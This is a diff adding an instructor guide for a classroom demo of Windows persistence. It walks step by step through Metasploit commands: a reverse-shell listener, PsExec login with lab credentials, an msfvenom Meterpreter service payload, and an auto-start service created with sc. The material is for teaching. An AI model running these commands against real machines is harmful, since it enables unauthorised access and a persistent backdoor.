@@ -1,0 +1,48 @@
+#### Windows Persistence Demo
+To demonstrate persistence using malicious services, you will use `msfvenom` to generate a Meterpreter payload, transport it to the Windows machine, and register a service using it. 
+- This requires an active shell as SYSTEM on the Windows 10 machine. Note: The first six steps listed detail how to open a Meterpreter shell on the Windows 10 machine if you do not have an active session already.
+1. Log in to Kali and open a terminal. Start Metasploit with the following command:
+     - `msfconsole`
+     
+**Note:** If you already have Metasploit open and running, kill any jobs that may be running in the background with `jobs -K`.
+2. Load the `multi/handler` module with the following command:
+     - `use exploit/multi/handler`
+    
+3. Set the parameters to listen for the payload with the following commands:
+     - `set LHOST 172.22.117.100`
+     - `set LPORT 4444`
+     - `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
+     - `run -j`
+     ![A screenshot depicts the results of these commands.](Images/runmulti.PNG)    
+4. Load the module for PsExec with the following command:
+     - `use exploit/windows/smb/psexec`
+5. Set the following options:
+     - set RHOST 172.22.117.20
+     - set SMBUser tstark
+     - set SMBPass Password!
+     - set SMBDomain megacorpone
+     ![A screenshot depicts the options set correctly.](Images/msfsettings.PNG)
+6. Run the module, and you should get a shell back as SYSTEM.
+**Note:** If students ask what PSExec is, we will explore it more on Day 3. For now, they just need to know that PSExec is a way of remotely administrating Windows machines. There is also a Metasploit module for it.
+7. In a new terminal tab or window, generate a Meterpreter payload using `msfvenom` with the following command:
+     - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe-service > service.exe`
+     ![A screenshot depicts the results of the command.](Images/msfvenomservice.PNG)
+     - Point out to students that the format must be `exe-service` and not just `exe`. Executables run by Service Manager are different from regular executables.
+8. In the Meterpreter shell, upload the executable you created by using the following commands:
+     - `cd ../../../`
+     - `upload service.exe`
+     ![A screenshot depicts the results of the command.](Images/uploadWIN10.PNG)
+9. Enter a command shell in your Meterpreter shell:
+     - `shell`
+    
+10. Create a new service that will use your payload with the following command:
+     - `sc create TestService binPath= "C:\service.exe" start= auto`
+     ![A screenshot depicts the results of the command.](Images/makeservice.PNG)
+     - Inform students that `sc` stands for service control and is used to manage queries. We created a new service that will execute our payload and automatically start on login.
+     - **Note:** It's important to use double quotes instead of single quotes around the path to the executable. 
+11. Manually start the service with the following command:
+     - `sc start TestService`
+     ![A screenshot depicts the results of the command.](Images/runservice.PNG)
+     - You should now get a Meterpreter session back from the service executing the payload.
+Explain to students that they will now perform another persistence technique by creating a scheduled task that will execute a payload at a defined interval.
+- Ask the students if they have any questions before proceeding to the final activity.
